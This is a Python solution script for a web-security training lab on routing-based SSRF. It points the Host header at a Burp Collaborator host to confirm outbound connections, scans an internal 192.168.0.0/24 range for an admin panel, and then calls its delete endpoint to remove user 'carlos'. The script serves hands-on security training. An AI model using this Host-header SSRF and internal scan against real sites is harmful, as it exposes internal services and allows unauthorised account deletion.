"""
Lab 4: Routing-based SSRF
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf
Difficulty: Practitioner

📝 The front-end/middleware routes purely based on the Host header's
value. Point it at an internal IP and the FRONT-END itself connects there
on your behalf — confirm via Collaborator first, then scan the internal
192.168.0.0/24 range for the admin panel.
"""

from utils import get_session, request_with_host, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
COLLABORATOR_HOST = "YOUR-COLLABORATOR-ID.oastify.com"


def run():
    s = get_session()

    note("Step 1: confirm the Host header drives an actual outbound")
    note("connection by pointing it at Collaborator.")
    r = request_with_host(s, "GET", f"{TARGET}/", host_header=COLLABORATOR_HOST)
    log(f"Status: {r.status_code} — now check Burp Collaborator for a hit.")

    note("Step 2: scan the internal range for an admin panel.")
    for i in range(1, 255):
        host = f"192.168.0.{i}"
        try:
            r = request_with_host(s, "GET", f"{TARGET}/admin", host_header=host, timeout=3)
        except Exception:
            continue
        if r.status_code == 200 and "admin" in r.text.lower():
            log(f"Found internal admin panel at Host: {host}")
            r2 = request_with_host(s, "GET", f"{TARGET}/admin/delete",
                                    host_header=host, params={"username": "carlos"})
            log(f"Delete status: {r2.status_code}")
            return

    log("No internal admin panel found in range — adjust the scan range.", ok=False)


if __name__ == "__main__":
    run()
